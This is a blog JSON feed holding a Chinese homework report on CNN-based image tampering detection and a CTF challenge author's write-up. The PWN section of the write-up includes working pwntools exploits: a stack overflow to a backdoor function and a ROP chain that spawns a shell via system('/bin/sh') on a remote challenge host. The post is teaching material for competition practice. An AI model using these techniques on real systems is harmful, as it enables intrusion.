{
    "version": "https://jsonfeed.org/version/1",
    "title": "Sycamore's Blog • All posts by \"python\" tag",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/Homework/%E5%9F%BA%E4%BA%8E%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E5%9B%BE%E5%83%8F%E7%AF%A1%E6%94%B9%E6%A3%80%E6%B5%8B/",
            "url": "https://www.sycamore.top/Homework/%E5%9F%BA%E4%BA%8E%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E5%9B%BE%E5%83%8F%E7%AF%A1%E6%94%B9%E6%A3%80%E6%B5%8B/",
            "title": "基于卷积神经网络的图像篡改检测",
            "date_published": "2023-06-19T10:13:25.000Z",
            "content_html": "<div class=\"note info\">\n<p>作业 (o′┏▽┓｀o)</p>\n</div>\n<h2 id=\"图像篡改的类型\"><a class=\"anchor\" href=\"#图像篡改的类型\">#</a> 图像篡改的类型</h2>\n<p>实践中，图像篡改至少有以下几种类型：</p>\n<ol>\n<li>\n<p>图像内容的修改（Tampering），比如通过 PS 实现换脸或者修改合同文字。其中大部分都可以归类到截取、复制、删除。</p>\n</li>\n<li>\n<p>能够间接表达第一类篡改嫌疑的操作（Manipulation）。比如为了遮掩第一类篡改痕迹而做的中值滤波、高斯模糊、高斯噪音以及再次保存图像而产生的二次 JPEG 压缩。</p>\n</li>\n</ol>\n<p>一般而言，图像篡改的最终目的是识别第一类篡改，但是难度很大，需要很深厚的司法、摄影和图像专业知识，比如在传统的图像篡改识别领域，需要使用噪声一致性、几何一致性、光照一致性等方式来进行判断。在实际操作时，需要遍历可疑区域，且每一个可疑区域都需要遍历各种方法进行检验，所以非常地费时费力。</p>\n<p>如果使用机器学习的方法，可以利用图像分割的方式直接将篡改区域分割出来，然而实际训练没有这么简单。</p>\n<p>因为如果使用算法随意地进行图像拼接。这种方式可以生成无限多的数据，但用这些粗糙的训练数据训练出的模型往往无法应对经过精细 PS 的图像，若用同样粗糙的数据做检测，即便获得了好的结果也不能验证模型的有效性。而假如我们一张一张人工 PS，效率太低，完全无法满足训练模型的需要，因此我们的工作主要在识别第二类篡改。</p>\n<p>实验中，我们首先需要通过原始图片生成经过第二类篡改的图片，再生成这些数据对应的标签（已篡改 / 未篡改），然后投入卷积神经网络进行有监督的学习，并在每一轮 epoch 后对当前模型做检测，输出测试的精准度。</p>\n<h2 id=\"卷积神经网络cnn\"><a class=\"anchor\" href=\"#卷积神经网络cnn\">#</a> 卷积神经网络（CNN）</h2>\n<h3 id=\"为什么使用卷积神经网络\"><a class=\"anchor\" href=\"#为什么使用卷积神经网络\">#</a> 为什么使用卷积神经网络</h3>\n<ol>\n<li>\n<p>CNN 和深度神经网络（DNN）</p>\n<p>这里的 DNN 指的是直接用全连接的深度神经网络。</p>\n<p>对于图像而言，如果直接采用全连接的方法，巨大的参数量会造成很多问题，比如巨大的资源消耗、过拟合、局部最优，</p>\n<p>因为图片基本是 1000×1000 像素，再加上 RGB 颜色信息的 3 个参数，就会出现三百万的参数量，这是全连接神经网络绝对无法处理的，所以需要用 CNN 减少参数量级。</p>\n<p>CNN 用卷积层提取图像中的局部特征，用池化层大幅降低参数量级（降维）</p>\n<p>卷积层：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686727431/Typera/2023/06/4d21c7e3db7073a15d12d724f59dc984.gif\" alt=\"卷积层\" /></p>\n<p>用卷积核来过滤图像的各个小区域，从而得到这些小区域的特征值</p>\n<p>池化层：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687175841/Typera/2023/06/7e967b5220d5377df9e2c47844537eab.gif\" alt=\"image2\" /></p>\n<p>即使做完了卷积，图像仍然很大（因为卷积核比较小），所以为了降低数据维度，就进行下采样，</p>\n<p>如上图，20×20 的原始图片，采样窗口为 10×10，最终池化结果为一张 2×2 的特征图</p>\n</li>\n<li>\n<p>CNN 和基于特征提取的传统篡改检测</p>\n<p>传统篡改检测方法基于图像统计信息和物理特征检测图像篡改操作，主要针对对复制黏贴和拼接组合两种篡改手段，</p>\n<p>特征提取的方法多种多样，不再赘述，其计算过程大多过于繁琐，运用的函数复杂性远高于 CNN。</p>\n<p>而且对于大数据量的处理，CNN 更有优势：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686731027/Typera/2023/06/fe4c339cd26fdaa558292c2a0bbe298b.png\" alt=\"CNN\" /></p>\n<h2 id=\"对第二类图像篡改的检测\"><a class=\"anchor\" href=\"#对第二类图像篡改的检测\">#</a> 对第二类图像篡改的检测</h2>\n<h3 id=\"实验数据\"><a class=\"anchor\" href=\"#实验数据\">#</a> 实验数据</h3>\n<p>使用的原始数据集括训练集的 40 张图片和测试集的 20 张图片，均来自以往使用手机拍摄得到（无美颜）。</p>\n<p>首先，我们制作训练数据，用 python 的 cv2 库和 numpy 库实现高斯模糊、高斯噪声、中值模糊、二次 JPEG 压缩、亮度对比度修改等操作，然后篡改原始图片，保存原始图片和篡改后的图片，并保留各自的标签（1/0）。</p>\n<p>训练使用的图像块大小为 28×28，所以训练集截取了约 20 万个图像块，测试集截取了约 10 万个图像块。</p>\n<p>然后定义模型，完成训练后测试数据的准确率。</p>\n<p>我们总共选取了 60 张由手机拍摄的照片，其中 40 张作为训练集，20 张作为测试集。照片的选取需要遵从一定的标准，首先务必保证照片拍摄时没有开启美颜等模式，这会导致模型的训练和测试出现偏差（因为美颜本身也可以视作一种图片篡改）；其次拍摄模糊、歪斜的照片也需要出现在数据集中，这是为了保证数据集的多样性，让我们训练出来的模型面对多样的图片的时候能保持更高的准确性。</p>\n<p>然后我们需要对原始图片进行篡改，生成篡改后的数据集。我们一共实现了高斯模糊、高斯噪声、中值模糊、二次 JPEG 压缩、亮度 / 对比度修改 5 种篡改方法。其中，我们特意加入了亮度 / 对比度修改这种篡改方法，我们认为卷积神经网络在应对这种篡改方面无能为力，但需要经过实验验证。高斯模糊、中值模糊分别通过 cv2 库的 GaussianBlur () 和 medianBlur () 函数实现，其余篡改方法均通过自编写的函数实现。</p>\n<p>最后将篡改后的数据集和原始数据集进行乱序的合并，同时对应的标签（已篡改 / 未篡改）也要一一对应地合并。</p>\n<p>超参数如下：</p>\n<ul>\n<li>网络结构：6 层卷积，简单的 VGG 风格，每 2 层一个 pooling</li>\n<li>优化器：Adam</li>\n<li>epoch 数量：10</li>\n<li>学习率：前 5 个 epoch 学习率 1e-4，后 5 个是 1e-5</li>\n<li>batch_size：一次抓取 50 个样本训练</li>\n</ul>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687175862/Typera/2023/06/7040e9af89e49b6fddf3e0620c2f7916.png\" alt=\"image44\" /></p>\n<h3 id=\"实验结果\"><a class=\"anchor\" href=\"#实验结果\">#</a> 实验结果</h3>\n<p>高斯模糊、高斯噪声、中值模糊、二次 JPEG 压缩的检测结果都很不错，经过 10 轮 epoch 后，最终的精准度均稳定在 90% 以上。其中高斯噪声达到了 99%，我们认为应该是篡改图本身与原图对比明显的原因，通过对大量篡改图的学习，模型能很轻易地抽象出篡改的特征，从而进行更加精准的判断。</p>\n<p>亮度 / 对比度的精准度只有 50% 左右，这个结果表明，卷积神经网络对图像进行亮度 / 对比度的篡改检测无能为力。我们猜测这也许是因为这种篡改后的图片与原始图片没有本质上的区别，卷积神经网络抽象出的特征是类似于原图的，但这种想法的正确性还有待验证。</p>\n<p>高斯模糊：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686734917/Typera/2023/06/65359b472aa28e64f839e965bce97108.png\" alt=\"2\" /></p>\n<p>高斯噪声：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686742374/Typera/2023/06/e9e97cf8a1bd777db7afc55d9db4b480.png\" alt=\"image-20230614193251237\" /></p>\n<p>中值模糊：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687179264/Typera/2023/06/48ff4fc5e8acecfe8d9a492ca6d8ea11.png\" alt=\"image-20230614205309782\" /></p>\n<p>二次 JPEG 压缩：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686752710/Typera/2023/06/72c6c4569175987c83df64a5f748b19d.png\" alt=\"image-20230614222506299\" /></p>\n<p>亮度修改：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1686759533/Typera/2023/06/42b9386be2989de4375eb726319b3c13.png\" alt=\"image-20230615001847275\" /></p>\n<p>对比度修改：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1687179256/Typera/2023/06/5a4fa62d82228b6bc12025547582efe4.png\" alt=\"image-20230615083039860\" /></p>\n</li>\n</ol>\n",
            "tags": [
                "Python",
                "计算机视觉",
                "深度学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/",
            "title": "CUMTCTF-2022出题部分wp",
            "date_published": "2022-06-08T04:04:04.000Z",
            "content_html": "<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h3>\n<p>这题就不说了吧，连上啥都有，我连要用到的命令解释都给了～</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444312/Typera/2023/04/6c7177a450f396a3cc1df92db2cec62b.png\" alt=\"image-20230426013827815\" /></p>\n<h3 id=\"ret2text\"><a class=\"anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<p>看一下保护：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444337/Typera/2023/04/8810580d090cd91812198696d7ddb02d.png\" alt=\"image-20230426013852620\" /><br />\n 主函数：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444396/Typera/2023/04/b70fb5e227640f018d72822fc557ad7e.png\" alt=\"image-20230426013952537\" /><br />\n 后门函数：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444400/Typera/2023/04/217429008da529ab0c39ef4f51553b97.png\" alt=\"image-20230426013957304\" /></p>\n<p>栈溢出就行，一张好图理解一下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444407/Typera/2023/04/f1fddeaa3a59bd82ab8dbb7032f73399.png\" alt=\"image-20230426014002698\" /></p>\n<p>思路：用 ‘a' 覆盖 buf 一直到覆盖上 ebp，然后将 ret (返回地址) 的地方写入为后门函数的地址。</p>\n<p>双击左侧栏的 backdoor 函数，右侧能找到函数地址如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444409/Typera/2023/04/0462346171ca0ff7f93c6db0364f57de.png\" alt=\"image-20230426014006566\" /></p>\n<p>直接照思路这么写，能打通本地，但是会打不通远程，因为栈帧没有平衡（hint），这时候中间插个 retn 的 gadget 就能解决。</p>\n<p>随便找个 retn 的地址<br />\n这个就能用：</p>\n<p>最后，脚本如下（环境没关，可以继续打远程）：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444413/Typera/2023/04/d5ad6da67403e757b9bc721f47816524.png\" alt=\"image-20230426014010146\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(b&#x27;./ret2text&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">b&#x27;106.15.52.194&#x27;</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\">backdoor=<span class=\"number\">0x4011DD</span></span><br><span class=\"line\">retn=<span class=\"number\">0x401203</span></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>+p64(retn)+p64(backdoor)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;2022!&#x27;</span>,p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"overflow\"><a class=\"anchor\" href=\"#overflow\">#</a> overflow</h3>\n<p>保护和之前 ret2text 的一样，<br />\n同样可以使用栈溢出漏洞，但是没有一个写好的 backdoor 函数了。</p>\n<p>shift+F12 查看字符串，能找到 /bin/sh ，双击得到地址为：0x404050<br />\n 左侧也能找到 system () 函数，<br />\n这时我们可以通过 rop 将 /bin/sh 装入 system () 函数中来 getshell。</p>\n<p>具体 ROP 时什么东西可以自行搜索，这里详细说一下怎么利用，<br />\n有了 system，有了 /bin/sh，唯一的问题就是传参了（因为 我们要的是 system (&quot;/bin/sh&quot;)，要把 /bin/sh 当作参数传到 system 执行嘛），<br />\n我们可以用 rop 做到这一点：<br />\n64 位程序通过寄存器存放参数，所以我们可以用 pop rdi 将 /bin/sh 字串的地址压入 rdi，然后 ret，再把 esp 指向 system () 函数地址执行就能 getshell 了。</p>\n<p>所以，我们只需要用到 pop rdi ret 一个 gadget，用 ROPgadget 工具搜索一下就能得到地址，命令如下：<br />\n <code>ROPgadget --binary overflow --only &quot;pop|ret&quot;</code></p>\n<p>最后还有平衡栈帧的问题注意一下，脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./overflow&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">b&#x27;106.15.52.194&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x4012e3</span></span><br><span class=\"line\">bin_sh=<span class=\"number\">0x404050</span></span><br><span class=\"line\">system=<span class=\"number\">0x401090</span></span><br><span class=\"line\">retn=<span class=\"number\">0x40101a</span></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">11</span> + p64(pop_rdi) + p64(bin_sh) + p64(retn) + p64(system)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;name?\\n&#x27;</span>,p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"caesar\"><a class=\"anchor\" href=\"#caesar\">#</a> Caesar</h3>\n<p>简单的凯撒加密...<br />\n 写个脚本遍历，或者网上找个线上的解密网站一位位地试，或者你能直接猜出来内容，都行...<br />\n 贴个遍历所有结果的脚本：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">model = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class=\"line\">model2 = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str1 = <span class=\"string\">&quot;Fdhvdu_lv_wrr_Hdcb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> str1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s.islower():</span><br><span class=\"line\">            n = model.find(s)</span><br><span class=\"line\">            s = model[n-key]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> s.isupper():</span><br><span class=\"line\">            n = model2.find(s)</span><br><span class=\"line\">            s = model2[n-key]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到 flag 内容为 Caesar_is_too_Eazy<br />\n（不觉着放眼望去只有这个能读通吗？）</p>\n<h3 id=\"caesar-2\"><a class=\"anchor\" href=\"#caesar-2\">#</a> Caesar？</h3>\n<p>凯撒 + 栅栏<br />\n密文：fwid_huqifxf {vFv_ghhpwHbddd_q}<br />\n 结合题目知道这不是简单的凯撒，观察密文结构，仔细观察 {} 和 _ 的位置，基本能猜到是栅栏吧。。。</p>\n<p>用上题脚本遍历，挑出 f、c、b 开头的字串逐一尝试栅栏解密，可以得到最终的 flag<br />\n（因为栅栏不会改变第一个字母，所以分别是 flag、cumtctf、bxsctf，逐一尝试即可）。<br />\n虽然理论上来说两个解密的顺序反一反都能出，但这样更好解一点...</p>\n<p>ps：栅栏每组字数为 3</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"fifo-lru-opt\"><a class=\"anchor\" href=\"#fifo-lru-opt\">#</a> fifo &amp; lru &amp; opt</h3>\n<p>本来还想放提示，没想到做出来的人挺多。<br />\n关于这三个算法，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob3ViYi5naXRodWIuaW8vMjAyMC8xMC8wNC9vcy0xMC1wYWdlLWV4Y2hhbmdl\">这篇博客</span>上都有了，就不多赘述了。<br />\n如果感兴趣的话，其他相关的算法这篇博客上也都有，挺全面的。</p>\n<p>fifo 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  7  7  7  7  7  7  7<br />\n2  2  2  2  2  2  2  2  2  1  1  1  1  1<br />\n3  3  3  3  3  3  3  3  2  2  2  2<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7  1  2</p>\n<p>lru 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  7  7  7  7  7  7  7<br />\n2  2  2  2  2  2  2  2  2  2  2  2  2  2<br />\n3  3  3  3  3  3  3  1  1  1  1  1<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7  1</p>\n<p 123671212367112367=\"\">opt 算法内存状态为：<br />\n1  2  1  3  2  2  6  6  7  2  1  2  7  2  6<br />\n1  1  1  1  1  1  1  1  1  1  1  1  1  1  1<br />\n2  2  2  2  2  2  2  2  2  2  2  2  2  2<br />\n3  3  3  3  3  7  7  7  7  7  7  7<br />\n6  6  6  6  6  6  6  6  6<br />\n 调入队列为 1  2  3  6  7<br />\n 三者连起来得到 flag：cumtctf</p>\n<h3 id=\"套\"><a class=\"anchor\" href=\"#套\">#</a> 套！</h3>\n<p>这道题，说实话就是拿来娱乐一下，送送分的 (/▽＼)...<br />\n 分三步：</p>\n<ol>\n<li>新约佛论禅（<span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">解密网址</span>）</li>\n<li>Ook!（<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sLnlzbmVrby5jb20vYnJhaW5mdWNrLw==\">Brainfuck / Ook!</span>）</li>\n<li>Brainfuck（网址与 Ook 一样）</li>\n</ol>\n<h3 id=\"左右\"><a class=\"anchor\" href=\"#左右\">#</a> 左 &amp; 右</h3>\n<p>音频隐写<br />\n一个原音频（Counting_Stars.wav），一个修改过的（out.wav）</p>\n<p>我出题的过程：把 flag 加密成摩斯密码，把摩斯密码分成两部分，用脚本输出为摩斯电码音频，左右声道分别和原音频相加，同时右声道反向。<br />\n因为左右声道藏的内容不太一样，所以不能直接相加...</p>\n<p>用 Audacity 打开两个音频，放大查看如下（还是挺明显的吧）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444431/Typera/2023/04/58af7c321f6bb65d3a0870493389096c.png\" alt=\"image-20230426014027631\" /><br />\n 所以，得到摩斯的方法：out 的左声道 - 原音频左声道，可得前半部分 flag，out 的右声道 + 原音频右声道，可得后半部分 flag</p>\n<p>至于怎么加怎么减，我是使用 python 写的脚本，当然还有其他方法（比如有个同学使用的 Au，我是真没想到可以这么解），<br />\n不过个人觉着都可以试着用 python 写写看，这样以后遇到类似的题目，即使可能用不了其他的方法，或许你也可以用 python 解决。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> wave</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\">ori = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Counting_Stars.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)\t<span class=\"comment\"># 原音频</span></span><br><span class=\"line\">out = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;out.wav&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)\t\t\t\t<span class=\"comment\"># 隐写音频</span></span><br><span class=\"line\">exp = wave.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;exp.wav&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)\t\t\t\t<span class=\"comment\"># 处理过后得到的摩斯电码音频</span></span><br><span class=\"line\">exp.setnchannels(<span class=\"number\">2</span>)\t\t\t<span class=\"comment\"># 设置声道数为2</span></span><br><span class=\"line\">exp.setsampwidth(<span class=\"number\">2</span>)\t\t\t<span class=\"comment\"># 设置量化位数为2</span></span><br><span class=\"line\">exp.setframerate(<span class=\"number\">44100</span>)\t\t<span class=\"comment\"># 设置采样频率为44100</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(out.getnframes()):\t\t\t<span class=\"comment\"># 一帧帧地读取数据</span></span><br><span class=\"line\">\tlori,rori=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, ori.readframes(<span class=\"number\">1</span>))\t<span class=\"comment\"># 原音频左右声道数据分别存入lori、rori</span></span><br><span class=\"line\">\tlout,rout=struct.unpack(<span class=\"string\">&#x27;hh&#x27;</span>, out.readframes(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tlexp = lout - lori\t\t<span class=\"comment\"># 左声道相减，存入lexp</span></span><br><span class=\"line\">\trexp = rout + rori</span><br><span class=\"line\">\texp.writeframes(struct.pack(<span class=\"string\">&#x27;hh&#x27;</span>,lexp,rexp))\t\t<span class=\"comment\"># 把lexp、rexp的数据打包后存入exp.wav</span></span><br></pre></td></tr></table></figure><br />\n 解出 exp.wav 之后，去摩斯解密的网站解密即可得到 flag 的内容。</p>\n<h3 id=\"嘿嘿压缩包\"><a class=\"anchor\" href=\"#嘿嘿压缩包\">#</a> 嘿嘿，压缩包？</h3>\n<p>简单的 LSB + ZIP 压缩包 + SSTV</p>\n<p>给了一张图和一个压缩包，<br />\n注意图片的名字是 hint.png。。。</p>\n<p>stegsolve 打开，LSB 隐写能看到提示信息：<br />\n1.Plaintext_Attack 2. zSdL#Z7oym!9j8m3</p>\n<p>第一个提示明文攻击，第二个是密码<br />\n（可能是我的密码设置的有问题？最后一位是 3，可能有点迷惑性...）</p>\n<p>打开压缩包，里面有一个名字一样的图片，用同样的压缩算法压缩已知图片，观察二者的 CRC 校验码一致，结合之前的提示，用 ARCHPR 使用明文攻击解开<br />\n（这里出 bug 了，最后压缩的时候放错了一个压缩包，导致明文攻击失败，现文件已更新）<br />\n明文攻击后，可以获得压缩包 flag.zip，可使用之前 LSB 得到的密码解开.</p>\n<p>解开后，获得音频文件 flag.wav，可以听出来是 SSTV  （。＾▽＾）</p>\n<p>最后，使用 robot36 解码 SSTV 音频，可以解出图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444438/Typera/2023/04/d80937655349012b4803de6fadc1e8de.png\" alt=\"image-20230426014034071\" /><br />\n（robot36 为安卓端软件)</p>\n<p>扫码得到 flag</p>\n<h3 id=\"12_bubu_cli\"><a class=\"anchor\" href=\"#12_bubu_cli\">#</a> 12_bubu_cli</h3>\n<p>nc 81.68.81.111 2333<br />\n 输出如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444445/Typera/2023/04/9aacfad409013817db6c5378063a2777.png\" alt=\"image-20230426014040530\" /></p>\n<p>先仔细观察一下输出的东西，在命令行里，我们可以发现，输出的是一些带颜色的数字 9，这些数字 9 组成了一张张的图片。（应该能看出来是几张图片，对吧）</p>\n<p>然后我们把输出的内容保存到文本文件里查看：nc 81.68.81.111 2333 &gt; 1.txt<br />\n 大致内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444454/Typera/2023/04/8032d3085f735ce7f02fb11e33c5ca60.png\" alt=\"image-20230426014048819\" /></p>\n<p>可以看到， <code>&lt;0x1b&gt;[</code> （即  <code>\\x1b[</code> ）将文本分割成了很多组，这就是 ANSI 转义字符。</p>\n<p>ANSI 转义字符用  <code>ESC[</code> 打头，而 <code>ESC</code>  用 ASCII 码表示为 <code>\\x1b</code> （十六进制的 <code>1b</code> ）</p>\n<p>涉及到的转义字符<strong>解释</strong>：<br />\n <code>\\x1b[nA</code> ：光标上移 n 行<br />\n <code>\\x1b[38;</code> ：设置前景色，后跟  <code>5;n</code>  代表使用 8 位 256 颜色码，后跟  <code>2;r;g;b</code>  代表 24 位 RGB 颜色码；后接 m 加字符，即为显示的字符</p>\n<p>比如 <code>\\x1b[38;2;0;0;0m5</code> ，就是输出黑色的 5.</p>\n<p>该文件里的输出都是使用 <code>\\x1b[38;2;r;g;bm9</code> ，<br />\n也就是说，我们只要提取出这些字符中间的 r g b 三位，然后用 PIL 组合成图片就行了。</p>\n<p>除此之外，我们还可以注意到：基本上每隔一段字符，会出现固定长度的一串 <code>\\x1b[nA</code> ，<br />\n从上述的解释中，我们已经可以知道，这是让光标上移的转义字符，<br />\n因此，我们大概能够知晓，输出的图片应该就是被这些字符分割的。</p>\n<p>所以，我们可以推断出，图片的长度应该是 <code>\\x1b[nA</code>  字符的个数 -1，<br />\n从而我们获得了图片的长度为 200，<br />\n同样的，我们也可以通过统计一行上 <code>\\x1b[38;</code>  字符的个数，确定宽度也为 200.<br />\n（这两个数据都是使用 PIL 生成图片时必须的）</p>\n<p>转换脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;1.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">    farmes = fp.read().split(<span class=\"string\">&quot;\\x1b[A&quot;</span>*<span class=\"number\">201</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\">farmes.pop(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> frame <span class=\"keyword\">in</span> farmes:</span><br><span class=\"line\">    rgb_list = re.findall(<span class=\"string\">r&quot;\\[38;2;(\\d*);(\\d*);(\\d*)m&quot;</span>, frame)</span><br><span class=\"line\">    <span class=\"comment\"># print(frame)</span></span><br><span class=\"line\">    img = Image.new(<span class=\"string\">&quot;RGB&quot;</span>, (<span class=\"number\">200</span>,<span 